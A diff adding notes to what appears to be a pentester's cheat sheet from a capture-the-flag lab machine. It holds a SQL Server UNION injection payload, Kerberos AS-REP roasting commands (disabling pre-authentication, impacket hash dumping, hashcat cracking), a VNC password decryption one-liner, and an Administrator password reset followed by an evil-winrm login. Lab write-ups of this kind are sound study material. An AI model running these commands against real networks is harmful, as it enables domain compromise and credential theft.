@@ -423,3 +423,59 @@ VNC Hex Passwd Decrypt
 #####################
 https://github.com/frizb/PasswordDecrypts
             echo -n <Hex Here> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
+
+
+######################
+ Hacking SQL Server via Burp Suite - Repeater
+######################
+https://dencode.com/en/string/unicode-escape
+https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/
+-
+https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
+to get the SID via SQL func:
+    unicode escape - to return in plain text:
+        ' UNION ALL SELECT 70,(SELECT master.dbo.vfn_varbintohexstr(SUSER_ID('MEGACORP\Domain Admins'))),70,70,70-- CJcx"
+
+        SID:
+            0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
+        
+        RID:
+            20000
+
+
+########################
+Kerberos ASREP
+#######################
+We use BloodHound: <--- From Multimaster Boxe
+        We find that we have the right to add user spn via the account:
+            *Evil-WinRM* PS C:\Users\s***\Desktop> Set-ADUser -Identity jorden -ServicePrincipalNames @{Add='HTTP/webserver', 'HTTP/SomeAlias'}
+
+
+    Get the added SPNs:
+        python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 megacorp.local/s****:***! -request:
+            ServicePrincipalName  Name    MemberOf                                      PasswordLastSet             LastLogon  Delegation 
+            --------------------  ------  --------------------------------------------  --------------------------  ---------  ----------
+            HTTP/SomeAlias        jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 19:48:17.503303  <never>               
+            HTTP/webserver        jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 19:48:17.503303  <never>   
+
+
+    We will set it to PRE-Auth and use GetNPUsers to dump the Hash:
+        *Evil-WinRM* PS C:\Users\s***\Desktop> Get-ADUser -Identity jorden | Set-ADAccountControl -doesnotrequirepreauth $true
+
+        python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.10.100 megacorp.local/s****:***! -request
+Cracking the AS_REP $23
+
+            └─$ hashcat hash.hash /usr/share/wordlists/rockyou.txt -m 18200
+
+
+####################
+Modify user - admin Password
+####################
+
+We Modify the Admin Passwd:
+    *Evil-WinRM* PS C:\Users\jorden\Documents> net user Administrator adib7575!
+
+
+We connect as Admin:
+    ─$ evil-winrm -i 10.10.10.179 -u administrator  -p adib7575!    
+    *Evil-WinRM* PS C:\Users\Administrator\Documents> 
